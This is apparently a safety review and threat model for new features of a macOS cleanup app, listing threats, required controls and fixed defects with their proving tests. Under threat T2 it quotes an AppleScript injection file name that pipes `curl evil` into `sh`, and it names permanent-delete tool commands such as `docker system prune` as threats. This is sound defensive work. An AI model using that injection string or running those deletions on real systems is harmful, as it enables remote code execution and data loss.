# Round 6 safety review (safety6)

Reviewer: safety6. Branch `agent6/safety6`. I never change app code. Defects are proven by
`#[ignore]` tests in `crates/core/tests/review_safety6.rs` and
`crates/ui-egui/tests/review_safety6_ui.rs` (FakeMac only). Severity: S1 = data loss, a move
outside the allow-list, an action without preview and confirmation, background change,
privilege escalation, injection. S2 = a safety rule weakened without direct loss (leak, keeps
running when off, missing lock reason). S3 = wording or hygiene.

## Baseline (what every round 6 feature inherits)

- `policy::check` / `check_move`: allow-list (strictly inside), no symlink on the path from the
  allow root down, protected places (SIP list, Documents and Desktop contents, iCloud,
  CloudStorage, Photos libraries by name, keychains, CleanCraft data, Notes, Messages), folder
  holding a protected place refused as a whole.
- `executor::execute_with`: digest of the confirmed plan, journal writable first, `lsof` open
  files and running app bundles skipped, one `rename` to the Trash of the item's volume or the
  quarantine (cross-volume rename fails, no copy-then-delete fallback), journal line per move.
- Not in the baseline (round 6 features must add it themselves where it matters): git-tracked
  content, files still being written (downloads in progress), dataless iCloud placeholders,
  copies that live only in the Trash, AppleScript string escaping, log hygiene.

## Threat model per feature

### dev6: Developer Clutter (target/, node_modules, venvs, simulators, Docker, Homebrew)

| # | Threat | Required control |
|---|---|---|
| D1 | A folder merely named `target`, `build`, `node_modules`, `venv` holds source or data (Maven site, a git-tracked `target/`, a vendored `node_modules` committed on purpose) | Marker required next to it (`Cargo.toml` for target/, `package.json` for node_modules, `pyvenv.cfg` inside a venv); refuse when the folder or anything in it is tracked by git (`git ls-files` / `git check-ignore` through `env.sys`), or when it holds its own `.git` |
| D2 | Projects inside `~/Documents` or `~/Desktop` (very common) get proposed | `policy::check` at scan time; these show as locked with the reason or not at all; allow roots never include Documents or Desktop |
| D3 | Scanning projects follows symlinks (pnpm stores, `npm link`, `node_modules/.bin`), escapes the allow root or loops | Walk with `symlink_metadata`, never descend links, depth limit; size with `fsutil::tree_size` (no follow) |
| D4 | Simulators removed with `xcrun simctl delete` / `erase` | That is a permanent delete. Only move `~/Library/Developer/CoreSimulator/Devices/<UDID>` folders of unavailable devices to the Trash, never while Simulator or a device is booted |
| D5 | Docker cleaned with `docker system prune`, `volume prune`, or by moving `Docker.raw` | Permanent and volumes hold databases. Docker is report only (show what `docker system df` says and the command for the user), or a preview plus explicit confirm per image, journaled as a Command with "cannot be undone"; never volumes, never `Docker.raw` |
| D6 | Homebrew cleaned with `brew cleanup` / `autoremove` / touching `Cellar` | Move only `~/Library/Caches/Homebrew/*` items through the executor; never `/opt/homebrew/Cellar`, `/usr/local/Cellar`, never `sudo` |
| D7 | A build or dev server is running (cargo, rust-analyzer, vite) and holds files in `target/` | executor open-file check covers it; plan reason says so; scan must not list in-use trees as preselected |
| D8 | Nested hits (a `target/` inside `node_modules`, a venv inside a project inside another) counted twice or the parent and child both selected | Outermost hit only |
| D9 | venvs preselected: the only record of installed packages when there is no requirements file | venvs never preselected (Risk High) |

### tray6: menu bar agent, login LaunchAgent, scheduled scans, notifications

| # | Threat | Required control |
|---|---|---|
| T1 | Agent or schedule cleans (calls `execute`, `run_plan`, a sweep Run, the CLI with `--yes`, an MCP `execute_plan`) | Background code only scans and notifies; no path from agent code to the executor. Proven by running the scheduled tick on a FakeMac full of junk: files stay, journal empty |
| T2 | Notification text built into an AppleScript string: `display notification "<file or app name>"`. A file named `x" & do shell script "curl evil|sh" & "` runs code | Never put names in notifications (counts and sizes only), and pass text as `osascript` argv (`on run argv`) or escape `\` and `"` |
| T3 | Notification click / URL scheme carries a plan id and digest and runs it | A click only opens the app on the page and rescans; it never confirms |
| T4 | LaunchAgent plist built with `format!`: app path with `&`, `<` breaks XML or injects keys (`ProgramArguments` changed); `sh -c` command string | XML-escape, `ProgramArguments` array of the binary and fixed flags, no shell, file mode 0644 in `~/Library/LaunchAgents`, through `env.sys` (`launchctl bootstrap/bootout gui/<uid>`) |
| T5 | Turned off but keeps running: plist left, agent not booted out, timer keeps firing, watchers alive | Off = bootout + plist moved away; the agent re-reads the setting each tick and exits when off |
| T6 | Agent uses the administrator path or `run_admin` | Never |
| T7 | Agent logs full paths (Notification Center, log files readable by others) | Logs in the data dir, counts only |
| T8 | install-app.sh uses sudo, writes outside the app folder, curls code | No sudo, no network |

### watch6: FSEvents watchers (drag-to-Trash uninstall offer, new app / startup item watch)

| # | Threat | Required control |
|---|---|---|
| W1 | An app dropped in the Trash triggers leftover removal on its own | Watcher only offers (notification / banner); leftovers go through the normal preview and confirm |
| W2 | The trashed app's Info.plist is untrusted: bundle id `com.apple.Safari`, `com`, empty, or `*` matches leftovers of other apps by prefix | Exact id match, refuse Apple ids and short ids, refuse when the same id is still installed elsewhere (a duplicate copy was trashed) |
| W3 | Event path is a symlink (`~/.Trash/Foo.app -> /Applications/Foo.app`) or outside the watched roots (`/Volumes/X/.Trashes`) | `symlink_metadata`, ignore links, canonical root check |
| W4 | Threat watch acts: unloads (`launchctl bootout`), moves or quarantines a new launch agent | Notify only; removal through Startup page preview |
| W5 | Notification text from app / plist names (see T2) | Same as T2 |
| W6 | Watchers alive after the setting is off, or recursive on the home folder (privacy, battery) | Watch only the fixed list (`~/.Trash`, `/Applications`, `~/Applications`, LaunchAgents and LaunchDaemons folders), non recursive where possible; dropping the handle when off |

### health6: Mac Health page, space history, AI agents guide

| # | Threat | Required control |
|---|---|---|
| H1 | Recommendation buttons run actions directly (a maintenance task with admin, a cleanup) | Each recommendation opens the feature page / preview; Tune-up keeps its own confirm |
| H2 | Space history file grows without bound, is written by the background agent with paths, or a corrupt file crashes the page | Numbers only, bounded length, corrupt file ignored |
| H3 | The AI guide tells users to turn on "agents may clean" or describes auto-confirm | The guide states preview and digest confirmation by the user |

### files6: Duplicate Downloads in Quick Sweep, Large & Old groups, Disk Map whole disk and external drives

| # | Threat | Required control |
|---|---|---|
| F1 | Quick Sweep Run moves a duplicate download with no per-file look | The confirmation lists every file; the kept copy is named |
| F2 | The "other copy" kept is in the Trash or the quarantine: the Downloads file is moved to the Trash, the Trash is emptied, both copies are gone | A copy in the Trash, quarantine, `.Trashes` never counts as the kept copy |
| F3 | The other copy is a dataless iCloud placeholder or in CloudStorage (not on disk) | Kept copies must be real local files outside cloud folders |
| F4 | Hard links of one file treated as two copies (nothing freed, confusing) | Same inode ignored (already rule C2) |
| F5 | A download in progress (`.crdownload`, `.download`, `.part`) or a file open in the browser | Skip partial downloads; executor open-file check |
| F6 | Large & Old group "select all" selects personal files in bulk; groups preselected | Nothing preselected (Risk High) |
| F7 | Disk Map whole disk widens the allow-list to `/` or `/Volumes/X` | Removal only inside the existing home allow-list (minus protected); everything else locked with its reason |
| F8 | Whole-disk walk follows `/Volumes/Macintosh HD -> /`, `/System/Volumes/Data` firmlinks, network mounts, Time Machine backups: loops, double counts, hangs | No symlink descent, one device per walk (`st_dev`), skip `/System/Volumes`, `.Spotlight-V100`, `.fseventsd`, `Backups.backupdb`, `.timemachine` |
| F9 | External drive items moved: Trash on that volume (`.Trashes/<uid>`); rename across volumes must never fall back to copy and delete | Baseline is right (rename only); keep it |

### Cross-cutting

| # | Threat | Required control |
|---|---|---|
| X1 | New settings default on (agent, schedule, watchers, notifications) | Off by default until the user turns them on |
| X2 | New code uses `remove_file`, `remove_dir_all`, `Command::new` directly | grep must stay empty; commands through `env.sys` |
| X3 | Scheduled scans save plans in the data dir; MCP `execute_plan` accepts any saved plan with the digest it computes itself | Plans from background scans are not executable without the UI confirm (or agents' setting stays the gate) |

## Defects

| ID | Sev | Owner | What | Proof | Status |
|---|---|---|---|---|---|
| SAF6-1 | S1 | dev6 | Tool cleanups ran permanent deletes (`simctl delete unavailable`, `docker image/builder prune`, `brew cleanup`) on whatever was there at run time, not the list shown | `d456_no_permanent_developer_cleanup_arguments`, `dev::d456_no_tool_delete_ever_runs` | fixed (dev6 43facd5: simulators are plan items moved with undo; Docker and Homebrew report only) |
| SAF6-2 | S1 | dev6 | `git ls-files -- <rel>` without `--literal-pathspecs`: a project named `app [old]` is a glob, a git-tracked `target/` unlocked | `dev::saf6_2_bracket_named_project_tracked_target_is_locked` | fixed (43facd5) |
| SAF6-3 | S2 | dev6 | Python venvs preselected in inactive projects | `dev::saf6_3_venvs_never_selected` | fixed (43facd5) |
| SAF6-5 | S2 | health6 | `mcp_setup::connect` replaced a symlinked settings file (`~/.claude.json`) with a plain file | `saf6_5_connect_keeps_a_linked_settings_file_a_link` | fixed (health6 439520a) |
| SAF6-6 | S1 (MAC-CHECK) | tray6 | Notification texts follow the `-e` options without `--`: a name starting with `-e` (an app dragged to the Trash) becomes an AppleScript statement (`do shell script`) | `saf6_6_notification_texts_never_become_statements` | fixed (tray6 ffd10da, `--` before the texts) |
| SAF6-7 | S1 | files6 | Erase in Mail on an unnamed account ran Mail's "In All Accounts" while the dialog counted one group | `saf6_7_erase_scope_matches_the_confirmed_numbers` | fixed (files6 55dab45) |
| SAF6-8 | S2 | apps6 | An edited uninstall plan (one app or batch) moves another installed app and its settings: `Uninstaller::validate` checks only running apps (since round 4; the batch widens it) | `review_safety6_apps::{a5_edited_batch_plan_cannot_take_other_apps_files, a5b_edited_single_plan_cannot_take_other_apps_files}` on agent6/safety6-apps | open |

SAF6-4 was a suspicion (a route to an installed app preselecting its data as leftovers); the
test showed it was already guarded and became the passing check `w6_*`.

Checked and found right (passing tests, kept as guards):
- tray6: `t1_scheduled_scan_moves_nothing` (full Quick Sweep sources, schedule due: no journal
  line, no file change, no admin call, no changing launchctl), `t4_login_agent_plist_is_an_argument_array`,
  argv notifications (string injection closed; only the getopt case SAF6-6 is left).
- watch6: `w1_*` (a trashed app's leftovers are offered, nothing moves), `w3_*` (a link in the
  Trash to an installed app selects nothing), `w6_*` (a route to an installed app is refused).
- health6: `h_connect_writes_valid_json_and_keeps_other_servers`, UI `h1_every_health_button_only_looks`
  (every Mac Health button only navigates or scans).
- dev6: own `.git` locked at scan, Documents projects locked and refused when an edited plan
  selects them, linked projects not followed.
- files6: `disk_map::f7_*` (edited Disk Map plan cannot reach /Library, /Applications, /Users/Shared,
  /private, /opt, a network share, a drive's .Spotlight-V100/.fseventsd/Backups.backupdb, a
  Photos library on a drive, the drive itself, Documents, iCloud, or a path through
  /Volumes/Macintosh HD), `disk_map::f9_*` (external file to that drive's .Trashes, undo),
  `f12_*` (Duplicate Downloads never lose the last copy when the kept one changed or went away).
- apps6 (side branch): a1-a4 (twins, running app, Apple apps, shared maker folder).
- Cross-cutting: `x1_background_features_default_off`, `x2_processes_start_only_in_sys`,
  `t1_background_code_never_reaches_removal`; UI way-forward rule `way_forward_*` (Mail open,
  Trash Bins, browsers open, Developer Clutter in Documents).

## Verification log

- 18:11 dev6 43facd5: SAF6-1, SAF6-2, SAF6-3 fixed.
- 18:22 health6 439520a: SAF6-5 fixed.
- 19:13 files6 55dab45: SAF6-7 fixed; Disk Map and Duplicate Downloads guards still pass.
- 19:40 apps6 6d5f550 (side branch): a1-a4 pass, SAF6-8 open.
- 19:45 tray6 ffd10da: SAF6-6 fixed.

## Real-Mac checks (cannot be proven here)

- osascript argument parsing (SAF6-6): confirm `osascript -e 'on run argv' -e '...' -e 'end run' -- "-e x"` passes "-e x" as argv 1.
- Mail's Mailbox > Erase Deleted Items menu shape (one account vs several, localized menu names) for files6's UI scripting.
- cleancraft:// links: whether the app receives URLs from Launch Services at all (no GetURL handler seen); if it does, they only navigate.
- External drives: rename into `/Volumes/X/.Trashes/<uid>` on exFAT and network volumes; read-only Time Machine snapshot folders fail cleanly.
